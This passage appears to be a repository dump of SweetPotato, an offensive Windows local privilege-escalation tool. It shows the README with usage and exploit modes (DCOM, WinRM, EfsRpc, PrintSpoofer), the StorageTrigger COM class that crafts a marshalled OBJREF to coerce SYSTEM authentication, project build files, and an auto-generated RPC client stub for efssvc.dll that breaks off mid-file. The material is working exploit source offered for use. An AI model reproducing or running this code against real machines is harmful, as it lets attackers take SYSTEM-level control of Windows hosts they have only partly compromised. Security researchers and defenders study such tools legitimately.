systemThread.Join();\r\n\r\n            } catch (Exception e) {\r\n                Console.WriteLine(\"[!] Failed to exploit COM: {0} \", e.Message);\r\n                Console.WriteLine(e.StackTrace.ToString());\r\n            }\r\n        }\r\n    }\r\n}\r\n"
        },
        {
          "name": "Properties",
          "type": "tree",
          "content": null
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 0.94140625,
          "content": "# SweetPotato\n### A collection of various native Windows privilege escalation techniques from service accounts to SYSTEM\n\n```\nSweetPotato by @_EthicalChaos_\n  Orignal RottenPotato code and exploit by @foxglovesec\n  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery\n  PrintSpoofer discovery and original exploit by @itm4n\n  EfsRpc built on EfsPotato by @zcgonvh and PetitPotam by @topotam\n  -c, --clsid=VALUE          CLSID (default BITS:\n                               4991D34B-80A1-4291-83B6-3328366B9097)\n  -m, --method=VALUE         Auto,User,Thread (default Auto)\n  -p, --prog=VALUE           Program to launch (default cmd.exe)\n  -a, --args=VALUE           Arguments for program (default null)\n  -e, --exploit=VALUE        Exploit mode\n                               [DCOM|WinRM|EfsRpc|PrintSpoofer(default)]\n  -l, --listenPort=VALUE     COM server listen port (default 6666)\n  -h, --help                 Display this help\n```\n"
        },
        {
          "name": "Security",
          "type": "tree",
          "content": null
        },
        {
          "name": "StorageTrigger.cs",
          "type": "blob",
          "size": 3.9638671875,
          "content": "﻿using System;\nusing System.Runtime.InteropServices;\n\nnamespace SweetPotato {\n\n    [ComVisible(true)]\n    internal class StorageTrigger : IMarshal, IStorage {\n\n        private IStorage storage;\n        private string binding;\n        private TowerProtocol towerProtocol;\n\n        public StorageTrigger(IStorage storage, string binding, TowerProtocol towerProtocol) {\n            this.storage = storage;\n            this.binding = binding;\n            this.towerProtocol = towerProtocol;\n        }\n\n        public void DisconnectObject(uint dwReserved) {\n        }\n\n        public void GetMarshalSizeMax(ref Guid riid, IntPtr pv, uint dwDestContext, IntPtr pvDestContext, uint MSHLFLAGS, out uint pSize) {\n            pSize = 1024;\n        }\n\n        public void GetUnmarshalClass(ref Guid riid, IntPtr pv, uint dwDestContext, IntPtr pvDestContext, uint MSHLFLAGS, out Guid pCid) {\n            pCid = new Guid(\"00000306-0000-0000-c000-000000000046\");\n        }\n\n        public void MarshalInterface(IStream pstm, ref Guid riid, IntPtr pv, uint dwDestContext, IntPtr pvDestContext, uint MSHLFLAGS) {\n\n            ObjRef objRef = new ObjRef(Ole32.IID_IUnknown,\n                  new ObjRef.Standard(0x1000, 1, 0x0703d84a06ec96cc, 0x539d029cce31ac, new Guid(\"{042c939f-54cd-efd4-4bbd-1c3bae972145}\"),\n                    new ObjRef.DualStringArray(new ObjRef.StringBinding(towerProtocol, binding), new ObjRef.SecurityBinding(0xa, 0xffff, null))));\n\n            uint written;\n            byte[] data = objRef.GetBytes();\n            pstm.Write(data, (uint)data.Length, out written);\n        }\n\n        public void ReleaseMarshalData(IStream pstm) {\n        }\n\n        public void UnmarshalInterface(IStream pstm, ref Guid riid, out IntPtr ppv) {\n            ppv = IntPtr.Zero;\n        }\n\n        public void Commit(uint grfCommitFlags) {\n            storage.Commit(grfCommitFlags);\n        }\n\n        public void CopyTo(uint ciidExclude, Guid[] rgiidExclude, IntPtr snbExclude, IStorage pstgDest) {\n            storage.CopyTo(ciidExclude, rgiidExclude, snbExclude, pstgDest);\n        }\n\n        public void CreateStorage(string pwcsName, uint grfMode, uint reserved1, uint reserved2, out IStorage ppstg) {\n            storage.CreateStorage(pwcsName, grfMode, reserved1, reserved2, out ppstg);\n        }\n\n        public void CreateStream(string pwcsName, uint grfMode, uint reserved1, uint reserved2, out IStream ppstm) {\n            storage.CreateStream(pwcsName, grfMode, reserved1, reserved2, out ppstm);\n        }\n\n        public void DestroyElement(string pwcsName) {\n            storage.DestroyElement(pwcsName);\n        }\n\n        public void EnumElements(uint reserved1, IntPtr reserved2, uint reserved3, out IEnumSTATSTG ppEnum) {\n            storage.EnumElements(reserved1, reserved2, reserved3, out ppEnum);\n        }\n\n        public void MoveElementTo(string pwcsName, IStorage pstgDest, string pwcsNewName, uint grfFlags) {\n            storage.MoveElementTo(pwcsName, pstgDest, pwcsNewName, grfFlags);\n        }\n\n        public void OpenStorage(string pwcsName, IStorage pstgPriority, uint grfMode, IntPtr snbExclude, uint reserved, out IStorage ppstg) {\n            storage.OpenStorage(pwcsName, pstgPriority, grfMode, snbExclude, reserved, out ppstg);\n        }\n\n        public void OpenStream(string pwcsName, IntPtr reserved1, uint grfMode, uint reserved2, out IStream ppstm) {\n            storage.OpenStream(pwcsName, reserved1, grfMode, reserved2, out ppstm);\n        }\n\n        public void RenameElement(string pwcsOldName, string pwcsNewName) {\n\n        }\n\n        public void Revert() {\n\n        }\n\n        public void SetClass(ref Guid clsid) {\n\n        }\n\n        public void SetElementTimes(string pwcsName, FILETIME[] pctime, FILETIME[] patime, FILETIME[] pmtime) {\n\n        }\n\n        public void SetStateBits(uint grfStateBits, uint grfMask) {\n        }\n\n        public void Stat(STATSTG[] pstatstg, uint grfStatFlag) {\n            storage.Stat(pstatstg, grfStatFlag);\n            pstatstg[0].pwcsName = \"hello.stg\";\n        }\n    }\n}\n"
        },
        {
          "name": "SweetPotato.csproj",
          "type": "blob",
          "size": 5.1572265625,
          "content": "﻿<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<Project ToolsVersion=\"15.0\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\">\r\n  <Import Project=\"$(MSBuildExtensionsPath)\\$(MSBuildToolsVersion)\\Microsoft.Common.props\" Condition=\"Exists('$(MSBuildExtensionsPath)\\$(MSBuildToolsVersion)\\Microsoft.Common.props')\" />\r\n  <PropertyGroup>\r\n    <Configuration Condition=\" '$(Configuration)' == '' \">Debug</Configuration>\r\n    <Platform Condition=\" '$(Platform)' == '' \">AnyCPU</Platform>\r\n    <ProjectGuid>{1BF9C10F-6F89-4520-9D2E-AAF17D17BA5E}</ProjectGuid>\r\n    <OutputType>Exe</OutputType>\r\n    <RootNamespace>SweetPotato</RootNamespace>\r\n    <AssemblyName>SweetPotato</AssemblyName>\r\n    <TargetFrameworkVersion>v4.6.1</TargetFrameworkVersion>\r\n    <FileAlignment>512</FileAlignment>\r\n    <Deterministic>true</Deterministic>\r\n    <TargetFrameworkProfile />\r\n    <PublishUrl>publish\\</PublishUrl>\r\n    <Install>true</Install>\r\n    <InstallFrom>Disk</InstallFrom>\r\n    <UpdateEnabled>false</UpdateEnabled>\r\n    <UpdateMode>Foreground</UpdateMode>\r\n    <UpdateInterval>7</UpdateInterval>\r\n    <UpdateIntervalUnits>Days</UpdateIntervalUnits>\r\n    <UpdatePeriodically>false</UpdatePeriodically>\r\n    <UpdateRequired>false</UpdateRequired>\r\n    <MapFileExtensions>true</MapFileExtensions>\r\n    <ApplicationRevision>0</ApplicationRevision>\r\n    <ApplicationVersion>1.0.0.%2a</ApplicationVersion>\r\n    <IsWebBootstrapper>false</IsWebBootstrapper>\r\n    <UseApplicationTrust>false</UseApplicationTrust>\r\n    <BootstrapperEnabled>true</BootstrapperEnabled>\r\n    <NuGetPackageImportStamp>\r\n    </NuGetPackageImportStamp>\r\n  </PropertyGroup>\r\n  <PropertyGroup Condition=\" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' \">\r\n    <PlatformTarget>AnyCPU</PlatformTarget>\r\n    <DebugSymbols>true</DebugSymbols>\r\n    <DebugType>full</DebugType>\r\n    <Optimize>false</Optimize>\r\n    <OutputPath>bin\\Debug\\</OutputPath>\r\n    <DefineConstants>DEBUG;TRACE</DefineConstants>\r\n    <ErrorReport>prompt</ErrorReport>\r\n    <WarningLevel>4</WarningLevel>\r\n    <AllowUnsafeBlocks>false</AllowUnsafeBlocks>\r\n    <Prefer32Bit>false</Prefer32Bit>\r\n    <CodeAnalysisRuleSet>\r\n    </CodeAnalysisRuleSet>\r\n  </PropertyGroup>\r\n  <PropertyGroup Condition=\" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' \">\r\n    <PlatformTarget>x64</PlatformTarget>\r\n    <DebugType>pdbonly</DebugType>\r\n    <Optimize>true</Optimize>\r\n    <OutputPath>bin\\Release\\</OutputPath>\r\n    <DefineConstants>TRACE</DefineConstants>\r\n    <ErrorReport>prompt</ErrorReport>\r\n    <WarningLevel>4</WarningLevel>\r\n    <Prefer32Bit>false</Prefer32Bit>\r\n    <CodeAnalysisRuleSet>\r\n    </CodeAnalysisRuleSet>\r\n  </PropertyGroup>\r\n  <PropertyGroup />\r\n  <PropertyGroup>\r\n    <StartupObject>SweetPotato.Program</StartupObject>\r\n  </PropertyGroup>\r\n  <PropertyGroup>\r\n    <ApplicationManifest>app.manifest</ApplicationManifest>\r\n  </PropertyGroup>\r\n  <ItemGroup>\r\n    <Reference Include=\"NtApiDotNet, Version=1.0.0.0, Culture=neutral, processorArchitecture=MSIL\">\r\n      <HintPath>packages\\NtApiDotNet.1.1.32\\lib\\net461\\NtApiDotNet.dll</HintPath>\r\n    </Reference>\r\n    <Reference Include=\"System\" />\r\n    <Reference Include=\"System.Core\" />\r\n  </ItemGroup>\r\n  <ItemGroup>\r\n    <Compile Include=\"12345678-1234-abcd-ef00-0123456789ab_1.0.cs\" />\r\n    <Compile Include=\"Com\\Ole32.cs\" />\r\n    <Compile Include=\"Com\\IEnumSTATSTG.cs\" />\r\n    <Compile Include=\"Com\\ILockBytes.cs\" />\r\n    <Compile Include=\"Com\\IMarshal.cs\" />\r\n    <Compile Include=\"Com\\IStorage.cs\" />\r\n    <Compile Include=\"Com\\IStream.cs\" />\r\n    <Compile Include=\"df1941c5-fe89-4e79-bf10-463657acf44d_1.0.cs\" />\r\n    <Compile Include=\"EfsRpc.cs\" />\r\n    <Compile Include=\"LocalNegotiator.cs\" />\r\n    <Compile Include=\"ObjRef.cs\" />\r\n    <Compile Include=\"Options.cs\" />\r\n    <Compile Include=\"PrintSpoofer.cs\" />\r\n    <Compile Include=\"Security\\Privilege.cs\" />\r\n    <Compile Include=\"Program.cs\" />\r\n    <Compile Include=\"Properties\\AssemblyInfo.cs\" />\r\n    <Compile Include=\"PotatoAPI.cs\" />\r\n    <Compile Include=\"Security\\SSPIHelper.cs\" />\r\n    <Compile Include=\"StorageTrigger.cs\" />\r\n  </ItemGroup>\r\n  <ItemGroup>\r\n    <None Include=\"app.config\" />\r\n    <None Include=\"app.manifest\" />\r\n    <None Include=\"packages.config\" />\r\n  </ItemGroup>\r\n  <ItemGroup>\r\n    <BootstrapperPackage Include=\"Microsoft.Net.Framework.3.5.SP1\">\r\n      <Visible>False</Visible>\r\n      <ProductName>.NET Framework 3.5 SP1</ProductName>\r\n      <Install>false</Install>\r\n    </BootstrapperPackage>\r\n  </ItemGroup>\r\n  <Import Project=\"$(MSBuildToolsPath)\\Microsoft.CSharp.targets\" />\r\n  <Import Project=\"packages\\dnMerge.0.5.13\\build\\dnMerge.targets\" Condition=\"Exists('packages\\dnMerge.0.5.13\\build\\dnMerge.targets')\" />\r\n  <Target Name=\"EnsureNuGetPackageBuildImports\" BeforeTargets=\"PrepareForBuild\">\r\n    <PropertyGroup>\r\n      <ErrorText>This project references NuGet package(s) that are missing on this computer. Use NuGet Package Restore to download them.  For more information, see http://go.microsoft.com/fwlink/?LinkID=322105. The missing file is {0}.</ErrorText>\r\n    </PropertyGroup>\r\n    <Error Condition=\"!Exists('packages\\dnMerge.0.5.13\\build\\dnMerge.targets')\" Text=\"$([System.String]::Format('$(ErrorText)', 'packages\\dnMerge.0.5.13\\build\\dnMerge.targets'))\" />\r\n  </Target>\r\n</Project>"
        },
        {
          "name": "SweetPotato.sln",
          "type": "blob",
          "size": 1.07421875,
          "content": "﻿\nMicrosoft Visual Studio Solution File, Format Version 12.00\n# Visual Studio Version 16\nVisualStudioVersion = 16.0.29509.3\nMinimumVisualStudioVersion = 10.0.40219.1\nProject(\"{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}\") = \"SweetPotato\", \"SweetPotato.csproj\", \"{1BF9C10F-6F89-4520-9D2E-AAF17D17BA5E}\"\nEndProject\nGlobal\n\tGlobalSection(SolutionConfigurationPlatforms) = preSolution\n\t\tDebug|Any CPU = Debug|Any CPU\n\t\tRelease|Any CPU = Release|Any CPU\n\tEndGlobalSection\n\tGlobalSection(ProjectConfigurationPlatforms) = postSolution\n\t\t{1BF9C10F-6F89-4520-9D2E-AAF17D17BA5E}.Debug|Any CPU.ActiveCfg = Debug|Any CPU\n\t\t{1BF9C10F-6F89-4520-9D2E-AAF17D17BA5E}.Debug|Any CPU.Build.0 = Debug|Any CPU\n\t\t{1BF9C10F-6F89-4520-9D2E-AAF17D17BA5E}.Release|Any CPU.ActiveCfg = Release|Any CPU\n\t\t{1BF9C10F-6F89-4520-9D2E-AAF17D17BA5E}.Release|Any CPU.Build.0 = Release|Any CPU\n\tEndGlobalSection\n\tGlobalSection(SolutionProperties) = preSolution\n\t\tHideSolutionNode = FALSE\n\tEndGlobalSection\n\tGlobalSection(ExtensibilityGlobals) = postSolution\n\t\tSolutionGuid = {2BF3BEBF-0E18-43E5-A34F-BC2C9ABDFEDD}\n\tEndGlobalSection\nEndGlobal\n"
        },
        {
          "name": "app.config",
          "type": "blob",
          "size": 0.15625,
          "content": "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<configuration>\n<startup><supportedRuntime version=\"v4.0\" sku=\".NETFramework,Version=v4.6.1\"/></startup></configuration>\n"
        },
        {
          "name": "app.manifest",
          "type": "blob",
          "size": 1.271484375,
          "content": "﻿<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<assembly manifestVersion=\"1.0\" xmlns=\"urn:schemas-microsoft-com:asm.v1\">\n  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>\n  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">\n    <security>\n      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">\n        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\" />\n      </requestedPrivileges>\n    </security>\n  </trustInfo>\n\n  <compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\">\n    <application>\n      <!-- A list of the Windows versions that this application has been tested on\n           and is designed to work with. Uncomment the appropriate elements\n           and Windows will automatically select the most compatible environment. -->\n\n      <!-- Windows Vista -->\n      <supportedOS Id=\"{e2011457-1546-43c5-a5fe-008deee3d3f0}\" />\n\n      <!-- Windows 7 -->\n      <supportedOS Id=\"{35138b9a-5d96-4fbd-8e2d-a2440225f93a}\" />\n\n      <!-- Windows 8 -->\n      <supportedOS Id=\"{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}\" />\n\n      <!-- Windows 8.1 -->\n      <supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\" />\n\n      <!-- Windows 10 -->\n      <supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\" />\n\n    </application>\n  </compatibility>\n</assembly>\n"
        },
        {
          "name": "df1941c5-fe89-4e79-bf10-463657acf44d_1.0.cs",
          "type": "blob",
          "size": 58.5087890625,
          "content": "//------------------------------------------------------------------------------\n// <auto-generated>\n//     This code was generated by a tool.\n//     Runtime Version:4.0.30319.42000\n//\n//     Changes to this file may cause incorrect behavior and will be lost if\n//     the code is regenerated.\n// </auto-generated>\n//------------------------------------------------------------------------------\n\n// Source Executable: c:\\windows\\system32\\efssvc.dll\n// Interface ID: df1941c5-fe89-4e79-bf10-463657acf44d\n// Interface Version: 1.0\n\n\n\nnamespace rpc_df1941c5_fe89_4e79_bf10_463657acf44d_1_0\n{\n    \n    #region Marshal Helpers\n    internal class _Marshal_Helper : NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer\n    {\n        public void Write_0(Struct_0 p0)\n        {\n            WriteStruct<Struct_0>(p0);\n        }\n        public void Write_1(Struct_1 p0)\n        {\n            WriteStruct<Struct_1>(p0);\n        }\n        public void Write_2(Struct_2 p0)\n        {\n            WriteStruct<Struct_2>(p0);\n        }\n        public void Write_3(Struct_3 p0)\n        {\n            WriteStruct<Struct_3>(p0);\n        }\n        public void Write_4(Struct_4 p0)\n        {\n            WriteStruct<Struct_4>(p0);\n        }\n        public void Write_5(Struct_5 p0)\n        {\n            WriteStruct<Struct_5>(p0);\n        }\n        public void Write_6(Struct_6 p0)\n        {\n            WriteStruct<Struct_6>(p0);\n        }\n        public void Write_7(Struct_7 p0)\n        {\n            WriteStruct<Struct_7>(p0);\n        }\n        public void Write_8(Struct_8 p0)\n        {\n            WriteStruct<Struct_8>(p0);\n        }\n        public void Write_9(Struct_9 p0)\n        {\n            WriteStruct<Struct_9>(p0);\n        }\n        public void Write_10(Struct_10 p0)\n        {\n            WriteStruct<Struct_10>(p0);\n        }\n        public void Write_11(Struct_11 p0)\n        {\n            WriteStruct<Struct_11>(p0);\n        }\n        public void Write_12(Struct_12 p0)\n        {\n            WriteStruct<Struct_12>(p0);\n        }\n        public void Write_13(Struct_13 p0)\n        {\n            WriteStruct<Struct_13>(p0);\n        }\n        public void Write_14(Struct_14 p0)\n        {\n            WriteStruct<Struct_14>(p0);\n        }\n        public void Write_15(Struct_15 p0)\n        {\n            WriteStruct<Struct_15>(p0);\n        }\n        public void Write_16(Struct_16 p0)\n        {\n            WriteStruct<Struct_16>(p0);\n        }\n        public void Write_17(Struct_1[] p0, long p1)\n        {\n            WriteConformantStructArray<Struct_1>(p0, p1);\n        }\n        public void Write_18(int[] p0, long p1)\n        {\n            WriteConformantArray<int>(p0, p1);\n        }\n        public void Write_19(sbyte[] p0)\n        {\n            WriteFixedPrimitiveArray<sbyte>(p0, 6);\n        }\n        public void Write_20(sbyte[] p0, long p1)\n        {\n            WriteConformantArray<sbyte>(p0, p1);\n        }\n        public void Write_21(Struct_6[] p0, long p1)\n        {\n            WriteConformantStructArray<Struct_6>(p0, p1);\n        }\n        public void Write_22(sbyte[] p0, long p1)\n        {\n            WriteConformantArray<sbyte>(p0, p1);\n        }\n        public void Write_23(sbyte[] p0, long p1)\n        {\n            WriteConformantArray<sbyte>(p0, p1);\n        }\n        public void Write_24(sbyte[] p0, long p1)\n        {\n            WriteConformantArray<sbyte>(p0, p1);\n        }\n        public void Write_25(Struct_12[] p0, long p1)\n        {\n            WriteConformantStructArray<Struct_12>(p0, p1);\n        }\n        public void Write_26(sbyte[] p0)\n        {\n            WriteFixedPrimitiveArray<sbyte>(p0, 16);\n        }\n        public void Write_27(Struct_15[] p0, long p1)\n        {\n            WriteConformantStructArray<Struct_15>(p0, p1);\n        }\n        public void Write_28(System.Guid[] p0, long p1)\n        {\n            WriteConformantArrayCallback<System.Guid>(p0, new System.Action<System.Guid>(this.WriteGuid), p1);\n        }\n        public void Write_29(long[] p0, long p1)\n        {\n            WriteConformantArray<long>(p0, p1);\n        }\n        public void Write_30(NtApiDotNet.Ndr.Marshal.NdrPipe<sbyte> p0)\n        {\n            WritePipe<sbyte>(p0);\n        }\n        public void Write_31(NtApiDotNet.Ndr.Marshal.NdrPipe<sbyte> p0)\n        {\n            WritePipe<sbyte>(p0);\n        }\n        public void Write_32(NtApiDotNet.Ndr.Marshal.NdrPipe<sbyte> p0)\n        {\n            WritePipe<sbyte>(p0);\n        }\n        public void Write_33(sbyte[] p0, long p1)\n        {\n            WriteConformantArray<sbyte>(p0, p1);\n        }\n        public void Write_34(sbyte[] p0, long p1)\n        {\n            WriteConformantArray<sbyte>(p0, p1);\n        }\n        public void Write_35(sbyte[] p0, long p1)\n        {\n            WriteConformantArray<sbyte>(p0, p1);\n        }\n        public void Write_36(sbyte[] p0, long p1)\n        {\n            WriteConformantArray<sbyte>(p0, p1);\n        }\n        public void Write_37(sbyte[] p0, long p1)\n        {\n            WriteConformantArray<sbyte>(p0, p1);\n        }\n        public void Write_38(sbyte[] p0, long p1)\n        {\n            WriteConformantArray<sbyte>(p0, p1);\n        }\n    }\n    internal class _Unmarshal_Helper : NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer\n    {\n        public _Unmarshal_Helper(NtApiDotNet.Win32.Rpc.RpcClientResponse r) : \n                base(r.NdrBuffer, r.Handles, r.DataRepresentation)\n        {\n        }\n        public _Unmarshal_Helper(byte[] ba) : \n                base(ba)\n        {\n        }\n        public Struct_0 Read_0()\n        {\n            return ReadStruct<Struct_0>();\n        }\n        public Struct_1 Read_1()\n        {\n            return ReadStruct<Struct_1>();\n        }\n        public Struct_2 Read_2()\n        {\n            return ReadStruct<Struct_2>();\n        }\n        public Struct_3 Read_3()\n        {\n            return ReadStruct<Struct_3>();\n        }\n        public Struct_4 Read_4()\n        {\n            return ReadStruct<Struct_4>();\n        }\n        public Struct_5 Read_5()\n        {\n            return ReadStruct<Struct_5>();\n        }\n        public Struct_6 Read_6()\n        {\n            return ReadStruct<Struct_6>();\n        }\n        public Struct_7 Read_7()\n        {\n            return ReadStruct<Struct_7>();\n        }\n        public Struct_8 Read_8()\n        {\n            return ReadStruct<Struct_8>();\n        }\n        public Struct_9 Read_9()\n        {\n            return ReadStruct<Struct_9>();\n        }\n        public Struct_10 Read_10()\n        {\n            return ReadStruct<Struct_10>();\n        }\n        public Struct_11 Read_11()\n        {\n            return ReadStruct<Struct_11>();\n        }\n        public Struct_12 Read_12()\n        {\n            return ReadStruct<Struct_12>();\n        }\n        public Struct_13 Read_13()\n        {\n            return ReadStruct<Struct_13>();\n        }\n        public Struct_14 Read_14()\n        {\n            return ReadStruct<Struct_14>();\n        }\n        public Struct_15 Read_15()\n        {\n            return ReadStruct<Struct_15>();\n        }\n        public Struct_16 Read_16()\n        {\n            return ReadStruct<Struct_16>();\n        }\n        public Struct_1[] Read_17()\n        {\n            return ReadConformantStructArray<Struct_1>();\n        }\n        public int[] Read_18()\n        {\n            return ReadConformantArray<int>();\n        }\n        public sbyte[] Read_19()\n        {\n            return ReadFixedPrimitiveArray<sbyte>(6);\n        }\n        public sbyte[] Read_20()\n        {\n            return ReadConformantArray<sbyte>();\n        }\n        public Struct_6[] Read_21()\n        {\n            return ReadConformantStructArray<Struct_6>();\n        }\n        public sbyte[] Read_22()\n        {\n            return ReadConformantArray<sbyte>();\n        }\n        public sbyte[] Read_23()\n        {\n            return ReadConformantArray<sbyte>();\n        }\n        public sbyte[] Read_24()\n        {\n            return ReadConformantArray<sbyte>();\n        }\n        public Struct_12[] Read_25()\n        {\n            return ReadConformantStructArray<Struct_12>();\n        }\n        public sbyte[] Read_26()\n        {\n            return ReadFixedPrimitiveArray<sbyte>(16);\n        }\n        public Struct_15[] Read_27()\n        {\n            return ReadConformantStructArray<Struct_15>();\n        }\n        public System.Guid[] Read_28()\n        {\n            return ReadConformantArrayCallback<System.Guid>(new System.Func<System.Guid>(this.ReadGuid));\n        }\n        public long[] Read_29()\n        {\n            return ReadConformantArray<long>();\n        }\n        public NtApiDotNet.Ndr.Marshal.NdrPipe<sbyte> Read_30()\n        {\n            return ReadPipe<sbyte>();\n        }\n        public NtApiDotNet.Ndr.Marshal.NdrPipe<sbyte> Read_31()\n        {\n            return ReadPipe<sbyte>();\n        }\n        public NtApiDotNet.Ndr.Marshal.NdrPipe<sbyte> Read_32()\n        {\n            return ReadPipe<sbyte>();\n        }\n        public sbyte[] Read_33()\n        {\n            return ReadConformantArray<sbyte>();\n        }\n        public sbyte[] Read_34()\n        {\n            return ReadConformantArray<sbyte>();\n        }\n        public sbyte[] Read_35()\n        {\n            return ReadConformantArray<sbyte>();\n        }\n        public sbyte[] Read_36()\n        {\n            return ReadConformantArray<sbyte>();\n        }\n        public sbyte[] Read_37()\n        {\n            return ReadConformantArray<sbyte>();\n        }\n        public sbyte[] Read_38()\n        {\n            return ReadConformantArray<sbyte>();\n        }\n    }\n    #endregion\n    #region Complex Types\n    public struct Struct_0 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteEmbeddedPointer<Struct_1[], long>(Member8, new System.Action<Struct_1[], long>(m.Write_17), Member0);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.ReadEmbeddedPointer<Struct_1[]>(new System.Func<Struct_1[]>(u.Read_17), false);\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_1[]> Member8;\n        public static Struct_0 CreateDefault()\n        {\n            return new Struct_0();\n        }\n        public Struct_0(int Member0, Struct_1[] Member8)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n        }\n    }\n    public struct Struct_1 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteInt32(Member0);\n            m.WriteEmbeddedPointer<Struct_2>(Member8, new System.Action<Struct_2>(m.Write_2));\n            m.WriteEmbeddedPointer<Struct_4>(Member10, new System.Action<Struct_4>(m.Write_4));\n            m.WriteEmbeddedPointer<string>(Member18, new System.Action<string>(m.WriteTerminatedString));\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadInt32();\n            Member8 = u.ReadEmbeddedPointer<Struct_2>(new System.Func<Struct_2>(u.Read_2), false);\n            Member10 = u.ReadEmbeddedPointer<Struct_4>(new System.Func<Struct_4>(u.Read_4), false);\n            Member18 = u.ReadEmbeddedPointer<string>(new System.Func<string>(u.ReadConformantVaryingString), false);\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public int Member0;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_2> Member8;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<Struct_4> Member10;\n        public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<string> Member18;\n        public static Struct_1 CreateDefault()\n        {\n            return new Struct_1();\n        }\n        public Struct_1(int Member0, System.Nullable<Struct_2> Member8, System.Nullable<Struct_4> Member10, string Member18)\n        {\n            this.Member0 = Member0;\n            this.Member8 = Member8;\n            this.Member10 = Member10;\n            this.Member18 = Member18;\n        }\n    }\n    public struct Struct_2 : NtApiDotNet.Ndr.Marshal.INdrConformantStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.WriteSByte(Member0);\n            m.WriteSByte(Member1);\n            m.Write_3(Member2);\n            m.Write_18(NtApiDotNet.Win32.Rpc.RpcUtils.CheckNull(Member8, \"Member8\"), Member1);\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.ReadSByte();\n            Member1 = u.ReadSByte();\n            Member2 = u.Read_3();\n            Member8 = u.Read_18();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrConformantStructure.GetConformantDimensions()\n        {\n            return 1;\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 4;\n        }\n        public sbyte Member0;\n        public sbyte Member1;\n        public Struct_3 Member2;\n        public int[] Member8;\n        public static Struct_2 CreateDefault()\n        {\n            Struct_2 ret = new Struct_2();\n            ret.Member8 = new int[0];\n            return ret;\n        }\n        public Struct_2(sbyte Member0, sbyte Member1, Struct_3 Member2, int[] Member8)\n        {\n            this.Member0 = Member0;\n            this.Member1 = Member1;\n            this.Member2 = Member2;\n            this.Member8 = Member8;\n        }\n    }\n    public struct Struct_3 : NtApiDotNet.Ndr.Marshal.INdrStructure\n    {\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)\n        {\n            Marshal(((_Marshal_Helper)(m)));\n        }\n        private void Marshal(_Marshal_Helper m)\n        {\n            m.Write_19(NtApiDotNet.Win32.Rpc.RpcUtils.CheckNull(Member0, \"Member0\"));\n        }\n        void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)\n        {\n            Unmarshal(((_Unmarshal_Helper)(u)));\n        }\n        private void Unmarshal(_Unmarshal_Helper u)\n        {\n            Member0 = u.Read_19();\n        }\n        int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()\n        {\n            return 1;\n        }\n        public sbyte[] Member0;\n        public static Struct_3 CreateDefault()\n        {\n            Struct_3 ret = new Struct_3();\n            ret.Member0 = new sbyte[6];\n            return ret;\n        }\n        public Struct_3(sbyte[] Member0)\n        {\n            this.Member0 